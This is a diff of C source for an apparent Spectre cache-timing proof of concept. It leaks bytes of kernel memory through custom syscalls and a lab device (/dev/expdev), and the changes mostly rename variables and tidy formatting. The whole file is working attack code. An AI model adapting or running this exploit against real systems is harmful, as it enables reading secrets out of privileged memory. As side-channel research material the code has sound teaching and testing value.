@@ -13,7 +13,7 @@
 #endif
 
 #define MY_MMAP_LEN (256)
-#define PAGE_SIZE 4096
+#define PAGE_SIZE (4096)
 
 unsigned int array1_size = 16;
 uint8_t * array2;
@@ -23,7 +23,7 @@ uint8_t * array2;
 #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], size_t malicious_y) {
+void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], size_t array2_offset) {
     static int results[256];
     int tries, i, j, k, mix_i, junk = 0;
     size_t training_x, x;
@@ -52,7 +52,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], size_t m
 
             /* Call the victim! */
             //victim_function(x);
-            syscall(329, malicious_x, malicious_y);
+            syscall(329, malicious_x, array2_offset);
         }
 
         /* Time reads. Order is lightly mixed up to prevent stride prediction */
@@ -91,44 +91,41 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], size_t m
 int main(int argc, const char **argv) {
     int i, score[2], len = 40;
     uint8_t value[2];
-    size_t kernel_array1, kernel_array2, secret_physical_address, secret_kernel_vir, prob_kernel_vir;
-    size_t malicious_x, malicious_y;
+    size_t array1_kva, array2_temp_kva, secret_pa, secret_kva, malicious_x, array2_offset;
+
+    // shared memory
     int fd;
-    int junk = 0;
-    register uint64_t time1, time2;
     fd = open("/dev/expdev", O_RDWR);
     if (fd < 0) {
         perror("Open call failed");
         return -1;
     }
-    array2 = mmap( NULL, MY_MMAP_LEN * PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+    array2 = mmap(NULL, MY_MMAP_LEN * PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
     if (array2 == MAP_FAILED) {
         perror("mmap operation failed");
         return -1;
     }
-    
-    kernel_array1 = syscall(330, 1);
-    kernel_array2 = syscall(330, 2);
-    sscanf(argv[1], "%lx", &secret_physical_address);
-    secret_kernel_vir = syscall(330, secret_physical_address);
+    size_t array2_kva = 0xffff88000fd00000; // get from kernel output: `sudo cat /prob/kmsg | grep Spectre`
 
+    // Spectre attack
+    array1_kva = syscall(330, 1);
+    array2_temp_kva = syscall(330, 2);
+    sscanf(argv[1], "%lx", &secret_pa);
+    secret_kva = syscall(330, secret_pa);
 
-    for (i = 0; i < 256 * 4096; i++) {
-        //printf("i = %d\n", i);
-	*(array2 + i) = 'x'; // write to array2 so in RAM not copy-on-write zero pages
+    for (i = 0; i < MY_MMAP_LEN * PAGE_SIZE; i++) {
+        *(array2 + i) = 'x'; // write to array2 so in RAM not copy-on-write zero pages
     }
     
-    
-    malicious_x = secret_kernel_vir - kernel_array1;
-    malicious_y = 0xffff88000fd00000 - kernel_array2;
+    malicious_x = secret_kva - array1_kva;
+    array2_offset = array2_kva - array2_temp_kva;
 
     printf("Reading %d bytes:\n", len);
-    
     while (--len >= 0) {
         printf("Reading at malicious_x = %p... ", (void *)malicious_x);
-	do {
-        	readMemoryByte(malicious_x, value, score, malicious_y);
-        } while (value[0] <= 31 || value[0] >= 127);
+        do {
+                readMemoryByte(malicious_x, value, score, array2_offset);
+            } while (value[0] <= 31 || value[0] >= 127);
         malicious_x++;
         printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
         printf("0x%02X=’%c’ score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
